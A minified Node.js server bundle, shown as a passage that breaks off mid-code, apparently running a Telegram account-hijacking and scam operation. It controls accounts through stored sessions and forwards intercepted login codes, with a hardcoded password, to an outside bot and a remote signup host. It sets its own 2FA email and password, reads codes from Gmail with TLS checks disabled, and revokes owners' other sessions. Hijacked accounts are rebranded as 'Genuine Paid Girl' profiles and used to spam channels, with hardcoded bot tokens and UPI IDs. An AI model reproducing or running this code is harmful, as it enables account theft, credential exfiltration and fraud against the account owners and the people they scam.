(()=>{var e={167:e=>{"use strict";e.exports=require("axios")},986:e=>{"use strict";e.exports=require("body-parser")},518:e=>{"use strict";e.exports=require("cloudinary")},582:e=>{"use strict";e.exports=require("cors")},142:e=>{"use strict";e.exports=require("dotenv")},860:e=>{"use strict";e.exports=require("express")},390:e=>{"use strict";e.exports=require("imap")},13:e=>{"use strict";e.exports=require("mongodb")},391:e=>{"use strict";e.exports=require("node-schedule-tz")},777:e=>{"use strict";e.exports=require("swagger-jsdoc")},948:e=>{"use strict";e.exports=require("swagger-ui-express")},156:e=>{"use strict";e.exports=require("telegram")},671:e=>{"use strict";e.exports=require("telegram/client/uploads")},819:e=>{"use strict";e.exports=require("telegram/events/index.js")},436:e=>{"use strict";e.exports=require("telegram/sessions")},81:e=>{"use strict";e.exports=require("child_process")},147:e=>{"use strict";e.exports=require("fs")},17:e=>{"use strict";e.exports=require("path")},459:(e,t,n)=>{console.log("in Cloudinary");const s=n(518),a=n(17),o=n(147),{fetchWithTimeout:i}=n(613);class c{static instance;resources=new Map;constructor(){s.v2.config({cloud_name:process.env.CL_NAME,api_key:process.env.CL_APIKEY,api_secret:process.env.CL_APISECRET})}static async getInstance(e){return c.instance||(c.instance=new c),await c.instance.getResourcesFromFolder(e),c.instance}async getResourcesFromFolder(e){console.log("FETCHING NEW FILES!! from CLOUDINARY"),await this.findAndSaveResources(e,"image")}async createNewFolder(e){await this.createFolder(e),await this.uploadFilesToFolder(e)}async overwriteFile(){try{const e=await s.v2.uploader.upload("./src/test.js",{resource_type:"auto",overwrite:!0,invalidate:!0,public_id:"index_nbzca5.js"});console.log(e)}catch(e){console.log(e)}}async findAndSaveResources(e,t){try{const{resources:n}=await s.v2.api.resources({resource_type:t,type:"upload",prefix:e,max_results:500});n.forEach((async e=>{try{this.resources.set(e.public_id.split("/")[1].split("_")[0],e.url),await async function(e,t){const n=e.substring(e.lastIndexOf(".")+1,e.length),s=a.resolve(__dirname,`./${t}.${n}`);i(e,{responseType:"arraybuffer"},2).then((a=>{if("OK"!==a?.statusText)throw new Error(`Unable to download file from ${e}`);try{o.existsSync(s)?(o.unlinkSync(s),o.writeFileSync(s,a.data,"binary"),console.log(`${t}.${n} Replaced!!`)):(o.writeFileSync(s,a.data,"binary"),console.log(`${t}.${n} Saved!!`))}catch(e){console.error(e)}})).catch((e=>{console.error(e)}))}(e.url,e.public_id.split("/")[1].split("_")[0])}catch(t){console.log(e),console.log(t)}}))}catch(e){console.log(e)}}async createFolder(e){try{return await s.v2.api.create_folder(e)}catch(e){throw console.error("Error creating folder:",e),e}}async uploadFilesToFolder(e){const t=Array.from(this.resources.entries()).map((async([t,n])=>{try{return await s.v2.uploader.upload_large(n,{folder:e,resource_type:"auto",public_id:t})}catch(e){throw console.error("Error uploading file:",e),e}}));try{return await Promise.all(t)}catch(e){throw console.error("Error uploading files:",e),e}}async printResources(){try{this.resources?.forEach(((e,t)=>{console.log(t,":",e)}))}catch(e){console.log(e)}}get(e){try{return this.resources.get(e)||""}catch(e){console.log(e)}}getBuffer(e){try{return this.resources.get(e)||""}catch(e){console.log(e)}}}e.exports={CloudinaryService:c}},213:(e,t,n)=>{const{MongoClient:s,ServerApiVersion:a}=n(13);class o{static instance;client=void 0;db=void 0;users=void 0;statsDb=void 0;statsDb2=void 0;isConnected=!1;constructor(){}static getInstance(){return o.instance||(o.instance=new o),o.instance}static isInstanceExist(){return!!o.instance}async connect(){if(this.isConnected)console.log("MongoConnection ALready Existing");else{console.log("trying to connect to DB......");try{return this.client=await s.connect(process.env.mongouri,{useNewUrlParser:!0,useUnifiedTopology:!0,serverApi:a.v1,maxPoolSize:15}),console.log("Connected to MongoDB"),this.isConnected=!0,this.client.on("close",(()=>{console.log("MongoDB connection closed."),this.isConnected=!1})),this.db=this.client.db("tgclients").collection("channels"),this.users=this.client.db("tgclients").collection("users"),this.statsDb=this.client.db("tgclients").collection("stats"),this.statsDb2=this.client.db("tgclients").collection("stats2"),!0}catch(e){return console.log(`Error connecting to MongoDB: ${e}`),!1}}}async insertChannel(e){const{title:t,id:n,username:s,megagroup:a,participantsCount:o,broadcast:i}=e,c=e.defaultBannedRights?.sendMessages,l={channelId:n.toString()};await(this.db?.findOne(l))||c||i||await this.db.insertOne({channelId:n.toString(),username:s?`@${s}`:null,title:t,megagroup:a,participantsCount:o})}async getChannels(e=50,t=0,n){const s={megagroup:!0,username:{$ne:null}},a={participantsCount:-1};n&&(s.$or=[{title:{$regex:n,$options:"i"}},{username:{$regex:n,$options:"i"}}]);const o={collation:{locale:"en",strength:1}};try{return n&&await(this.db?.createIndex({title:"text"})),await this.db.find(s,o).sort(a).skip(t).limit(e).toArray()}catch(e){return console.error("Error:",e),[]}}async insertUser(e){const t={mobile:e.mobile};try{await this.users.findOne(t)||await this.users.insertOne(e)}catch(e){console.log(e)}}async updateUser(e,t){const n={mobile:e.mobile};try{await this.users.updateOne(n,{$set:{...t}},{upsert:!0})}catch(e){console.log(e)}}async deleteUser(e){const t={mobile:e.mobile};try{await this.users.deleteOne(t)}catch(e){console.log(e)}}async getUser(e){const t={mobile:e.mobile};try{return await this.users.findOne(t)}catch(e){return void console.log(e)}}async getTempUser(){try{return await this.users.findOne({})}catch(e){console.log(e)}}async getUsersFullData(e=2,t=0){return await(this.users?.find({}).skip(t).limit(e).sort({_id:1}).toArray())||void 0}async insertInBufferClients(e){const t={mobile:e.mobile};try{const n=this.client.db("tgclients").collection("bufferClients");await n.updateOne(t,{$set:{...e}},{upsert:!0})}catch(e){console.log(e)}}async readBufferClients(e,t){const n=this.client.db("tgclients").collection("bufferClients"),s=e||{},a=t?n.find(s).limit(t):n.find(s),o=await a.toArray();return o?.length>0?o:[]}async getOneBufferClient(){const e=this.client.db("tgclients").collection("bufferClients");return await e.findOne({})||void 0}async deleteBufferClient(e){const t={mobile:e.mobile},n=this.client.db("tgclients").collection("bufferClients");try{await n.deleteOne(t)}catch(e){console.log(e)}}async getNewBufferClients(e){return this.users.find({mobile:{$nin:e},twoFA:{$exists:!1}}).sort({lastActive:1}).limit(20)}async readPromoteStats(){const e=this.client.db("tgclients").collection("promoteStats"),t=await e.find({},{projection:{client:1,totalCount:1,lastUpdatedTimeStamp:1,isActive:1,_id:0}}).sort({totalCount:-1}).toArray();return t.length>0?t:void 0}async readSinglePromoteStats(e){const t=this.client.db("tgclients").collection("promoteStats");return await t.findOne({client:e},{projection:{client:1,totalCount:1,lastUpdatedTimeStamp:1,isActive:1,_id:0}})}async readStats(){const e=await this.statsDb.find({}).sort({newUser:-1});return e?e.toArray():void 0}async read(e){return await this.db.findOne({chatId:e})||void 0}async removeOnefromChannel(e){try{await this.db.deleteOne(e)}catch(e){console.log(e)}}async getUsers(e,t=0){return await(this.users?.find({},{projection:{firstName:1,userName:1,mobile:1,_id:0}}).skip(t).limit(e).toArray())||void 0}async getupi(e){const t=this.client.db("tgclients").collection("upi-ids");return(await t.findOne({}))[e]||"lakshmi-69@paytm"}async getAllUpis(){const e=this.client.db("tgclients").collection("upi-ids");return await e.findOne({})}async updateUpis(e){const t=this.client.db("tgclients").collection("upi-ids");return await t.updateOne({},{$set:{...e}})}async getBuilds(){const e=this.client.db("tgclients").collection("builds");return await e.findOne({})}async updateBuilds(e){const t=this.client.db("tgclients").collection("builds");return await t.updateOne({},{$set:{...e}},{upsert:!0})}async getUserConfig(e){const t=this.client.db("tgclients").collection("clients");return await t.findOne(e)}async updateUserConfig(e,t){const n=this.client.db("tgclients").collection("clients");return(await n.findOneAndUpdate(e,{$set:{...t}},{returnOriginal:!1})).value}async insertInAchivedClient(e){const t=this.client.db("tgclients").collection("ArchivedClients");return await t.updateOne({number:e.number},{$set:{...e}},{upsert:!0})}async getInAchivedClient(e){const t=this.client.db("tgclients").collection("ArchivedClients");return await t.findOne(e)}async getAllUserClients(){const e=this.client.db("tgclients").collection("clients");return await e.aggregate([{$project:{_id:0,session:0,number:0,password:0}}]).toArray()}async getTgConfig(){const e=this.client.db("tgclients").collection("configuration");return await e.findOne({apiId:"1591339"})}async updateTgConfig(e){const t=this.client.db("tgclients").collection("configurations");return await t.updateOne({},{$set:{...e}})}async processUsers(e=void 0,t=void 0){return this.users.find({lastUpdated:{$exists:!1}}).limit(e||300).skip(t||0)}async clearStats(){const e=await this.statsDb.deleteMany({payAmount:{$lt:5}});console.log(e)}async clearStats2(){const e=await(this.statsDb2?.deleteMany({}));console.log(e)}async clearPromotionStats(){const e=this.client.db("tgclients").collection("promoteStats"),t=await e.deleteMany({});console.log(t)}async closeConnection(){try{this.isConnected&&(this.isConnected=!1,console.log("MongoDB connection closed.")),await(this.client?.close())}catch(e){console.log(e)}}async getCurrentActiveUniqueChannels(){const e=this.client.db("tgclients").collection("promoteStats").find({}),t=new Set;return await e.forEach((e=>{for(const n in e.data)t.add(n)})),Array.from(t)}async initPromoteStats(){const e=this.client.db("tgclients").collection("promoteStats"),t=await this.getAllUserClients();for(const n of t){const t={client:n.clientId,data:{},totalCount:0,uniqueChannels:0,lastupdatedTimeStamp:Date.now()};await e.findOne({client:n.clientId})||await e.insertOne(t)}}async getActiveChannels(e=50,t=0,n=[],s=[],a="activeChannels"){const o=new RegExp(n.join("|"),"i"),i=new RegExp("online|board|class|PROFIT|@wholesale|retail|topper|exam|medico|traini|cms|cma|subject|color|amity|game|gamin|like|earn|popcorn|TANISHUV|bitcoin|crypto|mall|work|folio|health|civil|win|casino|shop|promot|english|fix|money|book|anim|angime|support|cinema|bet|predic|study|youtube|sub|open|trad|cric|exch|movie|search|film|offer|ott|deal|quiz|academ|insti|talkies|screen|series|webser","i");let c={$and:[{username:{$ne:null}},{$or:[{title:{$regex:o}},{username:{$regex:o}}]},{channelId:{$nin:s}},{title:{$not:{$regex:i}}},{username:{$not:{$regex:i}}}]};const l={participantsCount:-1},r=this.client.db("tgclients").collection(a);try{return await r.find(c).sort(l).skip(t).limit(e).toArray()}catch(e){return console.error("Error:",e),[]}}async updateActiveChannels(){try{const e=this.client.db("tgclients").collection("promoteStats"),t=this.client.db("tgclients").collection("activeChannels"),n=e.find({}),s=new Set;await n.forEach((e=>{for(const t in e.data)t&&s.add(t)}));const a=Array.from(s),o=this.client.db("tgclients").collection("channels");for(const e of a)if(!await t.findOne({username:`@${e}`},{projection:{_id:0}})){const n=await o.findOne({username:`@${e}`},{projection:{_id:0}});n&&await t.insertOne(n)}}catch(e){console.log(e)}}async removeOnefromActiveChannel(e){try{const t=this.client.db("tgclients").collection("activeChannels");await t.deleteOne(e)}catch(e){console.log(e)}}}e.exports=o},365:(e,t,n)=>{const s=n(390);console.log("Started Mail Reader");let a=!1;const o=new s({user:process.env.GMAIL_ADD,password:process.env.GMAIL_PASS,host:"imap.gmail.com",port:993,tls:!0,tlsOptions:{rejectUnauthorized:!1}});o.once("ready",(function(){return console.log("ready"),a=!0,!0})),o.once("error",(e=>{console.error("SomeError :",e)})),o.once("end",(()=>{console.log("Connection ended")}));let i="";e.exports={getcode:async function(){return await async function(e){o.openBox("INBOX",!1,(()=>{const e={bodies:["HEADER","TEXT"],markSeen:!0};o.search([["FROM","noreply@telegram.org"]],((t,n)=>{if(t)throw t;if(console.log(n),n.length>0){const t=o.fetch([n[n.length-1]],e);t.on("message",((e,t)=>{const s=[];e.on("body",((e,n)=>{let a="";e.on("data",(e=>{a+=e.toString("utf8")})),e.on("end",(()=>{"TEXT"===n.which&&s.push(a),o.seq.addFlags([t],"\\Deleted",(e=>{if(e)throw e;o.expunge((e=>{if(e)throw e;console.log("Deleted message")}))}))}))})),e.once("end",(()=>{console.log(`Email #${t}, Latest${n[n.length-1]}`),console.log("EmailDataLength: ",s.length),console.log("Mail:",s[s.length-1].split(".")),i=function(e){const t=/\d+/g,n=e.match(t);return n?n.join(""):""}(s[s.length-1].split(".")[0])}))})),t.once("end",(()=>{console.log("fetched mails")}))}}))}))}(),console.log("Returning from mail Reader:",i),i.length>4&&o.end(),i},isMailReady:function(){return a},connectToMail:function(){i="",o.connect()},disconnectfromMail:function(){i="",o.end()}}},972:(e,t,n)=>{const s=n(777)({definition:{openapi:"3.0.0",info:{title:"ReddyGirl",version:"1.0.0",description:"API documentation for your Express application"}},apis:["./index.js"]});e.exports=s},98:(e,t,n)=>{const{TelegramClient:s,Api:a}=n(156),{NewMessage:o}=n(819),i=n(167),{StringSession:c}=n(436),{isMailReady:l,getcode:r,connectToMail:d,disconnectfromMail:g}=n(365),{CustomFile:u}=n(671),{sleep:m}=n(613),p=n(147),w=n(213),h=new Map;let y;function f(e){return h.get(e)}async function b(e){const t=f(e);return await(t?.disconnect()),h.delete(e)}class v{constructor(e,t){this.session=new c(e),this.phoneNumber=t,this.client=null,this.expired=!1,this.channelArray=[]}async disconnect(){await this.client.disconnect(),await this.client.destroy(),this.session.delete()}async createClient(e=!0){try{this.client=new s(this.session,parseInt(process.env.API_ID),process.env.API_HASH,{connectionRetries:5}),console.log("Stating Client - ",this.phoneNumber),await this.client.connect();const t=await this.client.getMessages("me",{limit:8});e?setTimeout((async()=>{this.client.connected||h.get(this.phoneNumber)?(console.log("SELF destroy client"),await this.client.disconnect(),await this.client.destroy(),this.session.delete()):console.log("Client Already Disconnected"),h.delete(this.phoneNumber)}),18e4):setInterval((async()=>{await this.client.connect()}),2e4),this.client.addEventHandler((async e=>{await this.handleEvents(e)}),new o);const n=await(this.client?.getDialogs({limit:500}));console.log("TotalChats:",n.total),this.expired={msgs:t.total,total:n.total}}catch(e){console.log(e),this.expired=void 0}}async getLastMsgs(e){const t=await this.client.getMessages("777000",{limit:parseInt(e)});let n="";return t.forEach((e=>{console.log(e.text),n=n+e.text+"\n"})),n}async channelInfo(e=!1){const t=await(this.client?.getDialogs({limit:600}));let n=0,s=0,a=0;return this.channelArray.length=0,console.log(t.total),t.map((async e=>{if(e.isChannel||e.isGroup)try{const t=await e.entity.toJSON(),{broadcast:o,defaultBannedRights:i}=t;a++,o||i?.sendMessages?s++:(n++,this.channelArray.push(t.id.toString()))}catch(e){console.log(e)}})),{chatsArrayLength:a,canSendTrueCount:n,canSendFalseCount:s,ids:e?this.channelArray:[]}}async joinChannels(e){const t=w.getInstance(),n=e.split("|");console.log(this.phoneNumber," - channelsLen - ",n.length);for(let e=0;e<n.length;e++){const s=n[e].trim();console.log(this.phoneNumber,"Trying: ",s);try{await this.client.invoke(new a.channels.JoinChannel({channel:await this.client.getEntity(s)})),console.log(this.phoneNumber," - Joined channel Sucesss - ",s);try{const e=await this.client.getEntity(s),{title:n,id:a,broadcast:o,defaultBannedRights:i,participantsCount:c,restricted:l,username:r}=e,d={id:a.toString(),title:n,participantsCount:c,username:r,restricted:l,broadcast:o,sendMessages:i?.sendMessages,canSendMsgs:!1};if(e.broadcast||i?.sendMessages)await t.removeOnefromActiveChannel({username:s.replace("@","")}),await t.removeOnefromChannel({username:s.startsWith("@")?s:`@${s}`}),console.log("Removed Cahnnel- ",s);else{d.canSendMsgs=!0;try{await t.updateActiveChannels(d.id.toString(),d),console.log("updated ActiveChannels")}catch(e){console.log(e),console.log("Failed to update ActiveChannels")}}}catch(e){console.log(this.phoneNumber," - Failed - ",e)}}catch(e){console.log("Channels ERR: ",e),(e.toString().includes("No user has")||e.toString().includes("USERNAME_INVALID"))&&(await t.removeOnefromActiveChannel({username:s.replace("@","")}),await t.removeOnefromChannel({username:s}),console.log("Removed Cahnnel- ",s))}console.log(this.phoneNumber," - On waiting period"),await new Promise((e=>setTimeout(e,18e4))),console.log(this.phoneNumber," - Will Try next")}console.log(this.phoneNumber," - finished joining channels"),await this.client.disconnect(),await b(this.phoneNumber)}async removeOtherAuths(){const e=(await this.client.invoke(new a.account.GetAuthorizations({}))).authorizations.map((e=>e.country.toLowerCase().includes("singapore")||e.deviceModel.toLowerCase().includes("oneplus")||e.deviceModel.toLowerCase().includes("cli")||e.deviceModel.toLowerCase().includes("linux")||e.appName.toLowerCase().includes("likki")||e.appName.toLowerCase().includes("rams")||e.appName.toLowerCase().includes("sru")||e.appName.toLowerCase().includes("shru")||e.deviceModel.toLowerCase().includes("windows")?e:(this.client.invoke(new a.account.ResetAuthorization({hash:e.hash})),null))).filter(Boolean);console.log(e)}async getAuths(){return await this.client.invoke(new a.account.GetAuthorizations({}))}async hasPassword(){return(await this.client.invoke(new a.account.GetPassword)).hasPassword}async blockAllUsers(){const e=await(this.client?.getDialogs({limit:600}));for(let t of e)t.isUser&&await this.blockAUser(t.id),m(5e3)}async blockAUser(e){await this.client.invoke(new a.contacts.Block({id:e}))}async getLastActiveTime(){const e=await this.client.invoke(new a.account.GetAuthorizations({}));let t=0;return e.authorizations.map((e=>{e.country.toLowerCase().includes("singapore")||t<e.dateActive&&(t=e.dateActive)})),t}async getMe(){return await this.client.getMe()}async deleteProfilePhotos(){try{const e=await this.client.invoke(new a.photos.GetUserPhotos({userId:"me"}));console.log(e),e&&e.photos?.length>0&&await this.client.invoke(new a.photos.DeletePhotos({id:e.photos})),console.log("Deleted profile Photos")}catch(e){console.log(e)}}async set2fa(){d();const e=setInterval((async()=>{l()&&(clearInterval(e),await this.client.updateTwoFaSettings({isCheckPassword:!1,email:"storeslaksmi@gmail.com",hint:"password - India143",newPassword:"Ajtdmwajt1@",emailCodeCallback:async e=>(console.log("code sent"),new Promise((async e=>{let t=0;const n=setInterval((async()=>{if(console.log("checking code"),t++,l()&&t<4){const t=await r();""!==t&&(clearInterval(n),g(),e(t))}else clearInterval(n),await this.client.disconnect(),await b(this.phoneNumber),g(),e(code)}),6e3)}))),onEmailCodeError:e=>(console.log(e),Promise.resolve("error"))}))}),5e3)}async updatePrivacyforDeletedAccount(){try{await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyPhoneCall({}),rules:[new a.InputPrivacyValueDisallowAll]})),console.log("Calls Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyProfilePhoto({}),rules:[new a.InputPrivacyValueAllowAll]})),console.log("PP Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyPhoneNumber({}),rules:[new a.InputPrivacyValueDisallowAll]})),console.log("Number Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyStatusTimestamp({}),rules:[new a.InputPrivacyValueDisallowAll]})),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyAbout({}),rules:[new a.InputPrivacyValueAllowAll]})),console.log("LAstSeen Updated")}catch(e){console.log(e)}}async updateProfile(e,t){try{await this.client.invoke(new a.account.UpdateProfile({firstName:e,lastName:"",about:t})),console.log("Updated NAme: ",e)}catch(e){console.log(e)}}async updateUsername(e){let t="",n=e&&""!==e?e:"",s=0;if(""===n)try{await this.client.invoke(new a.account.UpdateUsername({username:n})),console.log("Removed Username successfully.")}catch(e){console.log(e)}else for(;;)try{const o=await this.client.invoke(new a.account.CheckUsername({username:n}));if(console.log(o," - ",n),o){await this.client.invoke(new a.account.UpdateUsername({username:n})),console.log(`Username '${n}' updated successfully.`),t=n;break}n=e+s,s++,await m(4e3)}catch(a){if(console.log(a.message),"USERNAME_NOT_MODIFIED"==a.errorMessage){t=n;break}n=e+s,s++}return t}async updateProfilePic(e){try{const t=await this.client.uploadFile({file:new u("pic.jpg",p.statSync(e).size,e),workers:1});console.log("file uploaded- ",t),await this.client.invoke(new a.photos.UploadProfilePhoto({file:t})),console.log("profile pic updated")}catch(e){console.log(e)}}async updatePrivacy(){try{await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyPhoneCall({}),rules:[new a.InputPrivacyValueDisallowAll]})),console.log("Calls Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyProfilePhoto({}),rules:[new a.InputPrivacyValueAllowAll]})),console.log("PP Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyPhoneNumber({}),rules:[new a.InputPrivacyValueDisallowAll]})),console.log("Number Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyStatusTimestamp({}),rules:[new a.InputPrivacyValueAllowAll]})),console.log("LAstSeen Updated"),await this.client.invoke(new a.account.SetPrivacy({key:new a.InputPrivacyKeyAbout({}),rules:[new a.InputPrivacyValueAllowAll]}))}catch(e){console.log(e)}}async handleEvents(e){if(e.isPrivate&&"777000"==e.message.chatId.toString()){if(console.log("Login Code received for - ",this.phoneNumber,"\nSetup - ",y),y&&this.phoneNumber===y?.phoneNumber){console.log("LoginText: ",e.message.text);const t=e.message.text.split(".")[0].split("code:**")[1].trim();console.log("Code is:",t);try{await i.get(`https://tgsignup.onrender.com/otp?code=${t}&phone=${this.phoneNumber}&password=Ajtdmwajt1@`),console.log("Code Sent")}catch(e){console.log(e)}await b(this.phoneNumber)}console.log(e.message.text.toLowerCase());const t={chat_id:"-1001801844217",text:e.message.text};i.post("https://api.telegram.org/bot5807856562:AAFnhxpbQQ8MvyQaQGEg8vkpfCssLlY6x5c/sendMessage",t).then((e=>{})).catch((e=>{console.error("Error sending message:",e.response?.data?.description)})),await e.message.delete({revoke:!0})}}}e.exports={TelegramManager:v,hasClient:function(e){return h.has(e)},getClient:f,disconnectAll:async function(){const e=h.entries();console.log("Disconnecting All Clients");for(const[t,n]of e)try{await(n?.disconnect()),h.delete(t),console.log(`Client disconnected: ${t}`)}catch(e){console.log(e),console.log(`Failed to Disconnect : ${t}`)}},createClient:async function(e,t,n=!0){return h.has(e)?{msgs:10,total:10}:new Promise((async s=>{const a=new v(t,e);await a.createClient(n),a.expired&&h.set(e,a),s(a.expired)}))},deleteClient:b,getActiveClientSetup:function(){return y},setActiveClientSetup:function(e){y=e}}},613:(e,t,n)=>{const s=n(167);e.exports={sleep:function(e){return new Promise((t=>setTimeout(t,e)))},fetchWithTimeout:async function(e,t={},n=0){const a=t?.timeout||15e3,o=s.CancelToken.source(),i=setTimeout((()=>o.cancel()),a);for(let a=0;a<=n;a++)try{const n=await s({...t,url:e,cancelToken:o.token});return clearTimeout(i),n}catch(t){if(s.isCancel(t)?console.log("Request canceled:",t.message,e):console.log("Error:",t.message),!(a<n))return void console.error(`All ${n+1} retries failed for ${e}`);await new Promise((e=>setTimeout(e,2e3)))}}}}},t={};function n(s){var a=t[s];if(void 0!==a)return a.exports;var o=t[s]={exports:{}};return e[s](o,o.exports,n),o.exports}var s={};(()=>{"use strict";n(142).config();const e=n(860),t=n(167),s=n(391),a={timeZone:"Asia/Kolkata",timeZoneName:"short"},o=n(213),{getClient:i,hasClient:c,disconnectAll:l,createClient:r,deleteClient:d,setActiveClientSetup:g,getActiveClientSetup:u}=n(98),m=n(986),p=n(948),w=n(972),{sleep:h}=n(613),{fetchWithTimeout:y}=n(613),{execSync:f}=n(81),{CloudinaryService:b}=n(459);process.on("unhandledRejection",((e,t)=>{console.error("Unhandled Rejection at:",t,"reason:",e)})),process.on("exit",(async()=>{await o.getInstance().closeConnection(),await l()}));var v=n(582);const C=e(),A=new Map;let I,P,S;const $={};y("https://ipinfo.io/json").then((e=>e.data)).then((e=>{I=e,console.log(I)})).then((()=>{o.getInstance().connect().then((async()=>{setTimeout((async()=>{O.getinstance(),await k()}),100)}))})).catch((e=>console.error(e)));const x=()=>{let e;return e="bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA","https://api.telegram.org/bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA/sendMessage?chat_id=-1001801844217"},U=(process.env.apikey,"ALL_GOOD");async function k(){A.clear();const e=o.getInstance();await y(`${x()}&text=UptimeRobot : Refreshed Map`);const t=await e.getAllUserClients();P=t,S=await e.getAllUpis(),t.forEach((e=>{A.set(e.userName.toLowerCase(),{url:`${e.repl}/`,timeStamp:Date.now(),deployKey:e.deployKey,downTime:0,lastPingTime:Date.now(),clientId:e.clientId}),$[e.userName.toLowerCase()]=Date.now()}))}const D=[];try{s.scheduleJob("test3"," 25 2 * * * ","Asia/Kolkata",(async()=>{L();for(const e of A.values())try{(new Date).getUTCDate()%3==1&&await y(`${e.url}leavechannels`),R(e)}catch(e){console.log("Some Error: ",e.code)}await y("https://mychatgpt-pg6w.onrender.com/deletefiles")})),s.scheduleJob("test3"," 25 12 * * * ","Asia/Kolkata",(async()=>{R(),B()}))}catch(e){console.log("Some Error: ",e.code)}C.use(v()),C.use(m.json()),C.use("/api-docs",p.serve,p.setup(w)),C.get("/",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{})),C.get("/exitacc",(async(e,t,n)=>{O.getinstance(),t.send("Hello World!"),n()}),(async(e,t)=>{})),C.get("/checkBufferClients",(async(e,t,n)=>{O.getinstance(),t.send("Checking Buffer Clients"),n()}),(async(e,t)=>{await L()})),C.get("/processUsers/:limit/:skip",(async(e,t,n)=>{t.send("ok"),n()}),(async(e,t)=>{const n=e.params.limit?e.params.limit:30,s=e.params.skip?e.params.skip:20,a=await o.getInstance(),c=await a.processUsers(parseInt(n),parseInt(s));for(;await c.hasNext();){const e=await c.next(),t=await r(e.mobile,e.session),n=await i(e.mobile);if(t){console.log(e.mobile," :  true");const s=await n.getLastActiveTime(),o=new Date(1e3*s).toISOString().split("T")[0],i=await n.getMe();await a.updateUser(e,{msgs:t.msgs,totalChats:t.total,lastActive:s,date:o,tgId:i.id.toString(),lastUpdated:(new Date).toISOString().split("T")[0]}),await(n?.disconnect(e.mobile)),await d()}else console.log(e.mobile," :  false"),await a.deleteUser(e)}console.log("finished")})),C.get("/refreshMap",(async(e,t)=>{O.getinstance(),await k(),t.send("Hello World!")})),C.get("/clearstats2",(async(e,t)=>{O.getinstance();const n=o.getInstance();await n.clearStats2(),t.send("Hello World!")})),C.get("/exit",(async(e,t)=>{await o.getInstance().closeConnection(),process.exit(1),t.send("Hello World!")})),C.post("/channels",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{const n=e.body?.channels,s=o.getInstance();n?.forEach((async e=>{await s.insertChannel(e)}))}));let N=Date.now()-25e4;C.get("/setupClient/:clientId",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,n)=>{if(Date.now()>N+24e4){N=Date.now();const n=e.params?.clientId,s=e?.query?.a;console.log(n,s),await async function(e,n){try{const s=await o.getInstance(),a=await s.getUserConfig({clientId:e});let c;if(n&&a){try{const e=await s.getUser({mobile:(a?.number.toString()).replace("+","")});e&&await r(e?.mobile,e?.session,!1)&&(c=await i(e.mobile),await c.deleteProfilePhotos(),await h(5e3),await c.updatePrivacyforDeletedAccount()),delete e._id,await s.insertInBufferClients({...e})}catch(e){console.log("Error updateing settings of old Client - ",e)}delete a._id,a.insertedDate=(new Date).toISOString().split("T")[0],await s.insertInAchivedClient(a),console.log("Archived old client")}const l=await s.getOneBufferClient();if(await d(l.mobile),await h(2e3),l&&await r(l.mobile,l.session,!1)){const n=await i(l.mobile),o=e.match(/[a-zA-Z]+/g).toString();await b.getInstance(o);const r=o[0].toUpperCase()+o.slice(1);g({phoneNumber:l.mobile,clientId:e});const d=await n.updateUsername(`${r}Redd`);c?.updateProfile("Deleted Account",`New ACC: @${d}`),await h(3e3),await n.deleteProfilePhotos(),await h(3e3),await n.updatePrivacy(),await h(3e3),await n.updateProfilePic("./dp1.jpg"),await h(1e3),await n.updateProfilePic("./dp2.jpg"),await h(1e3),await n.updateProfilePic("./dp3.jpg"),await h(1e3),await n.updateProfile(a.name,"Genuine Paid Girl🥰, Best Services❤️"),await h(3e3);const u=await s.getInAchivedClient({number:`+${l.mobile}`});u?await _(u,e):await async function(e){try{console.log("String Generation started"),await h(2e3),await t.get(`https://tgsignup.onrender.com/login?phone=${e}`),console.log("Code Sent successfully")}catch(e){console.log(e)}}(l.mobile)}}catch(e){console.log(e)}}(n.toString(),"yes"===s?.toLowerCase())}else console.log("Profile Setup Recently tried")})),C.get("/updateClient/:clientId",(async(e,t,n)=>{t.send("Hello World!"),n()}),(async(e,t)=>{if(Date.now()>N+24e4){N=Date.now();const t=e.params?.clientId;console.log(t),await async function(e){try{const t=await o.getInstance(),n=await t.getUserConfig({clientId:e});if(n)try{const s=await t.getUser({mobile:(n?.number.toString()).replace("+","")});if(s&&await r(s?.mobile,s?.session)){const t=await i(s.mobile),a=e.match(/[a-zA-Z]+/g).toString();await b.getInstance(a);const o=a[0].toUpperCase()+a.slice(1);await t.updateUsername(`${o}Redd`),await h(5e3),await t.deleteProfilePhotos(),await h(3e3),await t.updatePrivacy(),await h(3e3),await t.updateProfilePic("./dp1.jpg"),await h(1e3),await t.updateProfilePic("./dp2.jpg"),await h(1e3),await t.updateProfilePic("./dp3.jpg"),await h(1e3),await t.updateProfile(n.name,"Genuine Paid Girl🥰, Best Services❤️")}}catch(e){console.log("Error updateing settings of old Client - ",e)}}catch(e){}}(t.toString())}else console.log("Profile Setup Recently tried")})),C.get("/getip",((e,t)=>{t.json(I)})),C.post("/users",(async(e,t,n)=>{t.send("Hello World!"),console.log(e.body),n()}),(async(e,t)=>{const n=e.body,s=o.getInstance(),a=i(n.mobile),c=u();a&&c?.phoneNumber===n.mobile?(g(void 0),console.log("New Session Generated"),await _(n,c),await d(n.mobile)):(await s.insertUser(n),await y(`${x()}&text=ACCOUNT LOGIN: ${n.userName?n.userName:n.firstName}:${n.msgs}:${n.totalChats}\n https://uptimechecker.onrender.com/connectclient/${n.mobile}`))})),C.get("/channels/:limit/:skip",(async(e,t,n)=>{const s=e.params.limit?e.params.limit:30,a=e.params.skip?e.params.skip:20,i=e.query?.k,c=o.getInstance(),l=await c.getChannels(parseInt(s),parseInt(a),i);let r="joinchannel:";for(const e of l)r=r+(e?.username?.startsWith("@")?e.username:`@${e.username}`)+"|";t.send(r)})),C.get("/activechannels/:limit/:skip",(async(e,t,n)=>{const 